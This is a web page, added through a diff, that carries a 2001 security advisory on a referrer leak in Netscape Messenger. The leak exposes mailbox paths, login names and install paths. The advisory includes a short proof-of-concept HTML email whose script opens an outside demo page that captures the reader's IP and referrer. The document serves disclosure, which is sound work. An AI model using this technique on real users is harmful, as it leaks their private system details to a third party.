@@ -1,0 +1,60 @@
+#define Title "Advisories : Mozilla/Netscape Referer information leak"
+#include "../include/intro.html"
+
+<pre><font class="fixed">
+
+Author                  : 3APA3A &lt;3APA3A@security.nnov.ru&gt;
+Affected software       : Netscape 4.7x All Platforms
+Vendor                  : Netscape (IPlanet)
+Risk                    : Low
+Remotely Exploitable    : Yes
+Released                : 30 May 2001
+Vendor URL              : http://www.netscape.com
+SECURITY.NNOV advisories: http://www.security.nnov.ru/advisories
+
+Background:
+
+Netscape  Messanger  uses  internal  protocol  called  mailbox://. The
+format of mailbox URI is
+ mailbox://full_path_to_user_folder?ID=some_message_d&amp;number=somenumber
+this  URI  contains full path to user's mailbox which usually contains
+user's  login  name  and  in case of Windows 9x - the path to Netscape
+installation.
+
+Problem:
+
+It's  possible  to  retrieve mailbox:// URI of the message. E.g., it's
+possible to retrieve mailbox location, user's system login and in some
+cases path to Netscape installation.
+
+Details:
+
+When  link  invoked  from  message,  Netscape sets "document.referrer"
+property  to URI of the message contained this link. Javascript on the
+target  page  is  able  to  retrieve  this property and pass it to any
+location together with IP of calling machine.
+
+Exploitation:
+
+The simple message below forces Netscape Messanger to open new window.
+Target  page  will  display your IP and document.refferer. If you read
+this  message  with  Netscape  Messanger  you can simply click http://
+reference below.
+-=-=-=-=-=-=-=-=-=-
+From: 3APA3A
+To: 3APA3A
+Subject: Test your Netscape
+Content-Type: text/html
+
+&lt;html&gt;&lt;script&gt;
+ window.open('http://www.security.nnov.ru/files/nsdemo.asp');
+&lt;/script&gt;&lt;/html&gt;
+-=-=-=-=-=-=-=-=-=-
+
+Vendor:
+
+Netscape was contacted May, 30 2001 via
+ http://help.netscape.com/forms/bug-security.html
+No feedback were given.
+</font></pre>
+#include "../include/postpage.html"
